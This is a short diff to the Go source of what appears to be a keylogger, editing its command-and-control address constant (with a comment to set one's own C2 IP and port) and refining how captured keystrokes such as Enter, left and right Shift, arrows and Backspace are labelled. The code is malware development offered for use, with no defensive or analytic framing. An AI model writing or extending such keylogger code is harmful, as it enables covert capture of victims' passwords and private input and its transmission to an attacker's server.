@@ -22,7 +22,7 @@ import (
 
 const (
 	// replace the C2 variable with your C2 IP and port to connect to
-	C2 string = "192.168.43.35:54321"
+	C2 string = "127.0.0.1:54321"
 )
 
 var (
@@ -104,9 +104,11 @@ func main() {
 													tmp := ""
 													switch key := e.KeyString(); key {
 													case "ENTER":
-														tmp = " [ENTER] "
-													case "SHIFT":
-														tmp = " [SHIFT] "
+														tmp = "[ENTER]"
+													case "R-SHIFT":
+														tmp = "[R-SHIFT]"
+													case "L-SHIFT":
+														tmp = "[L-SHIFT]"
 													case "Right":
 														tmp = "[R-ARROW]"
 													case "Left":
@@ -115,6 +117,8 @@ func main() {
 														tmp = "[U-ARROW]"
 													case "Down":
 														tmp = "[D-ARROW]"
+													case "BS":
+														tmp = "[BACKSPACE]"
 													default:
 														tmp = key
 													}
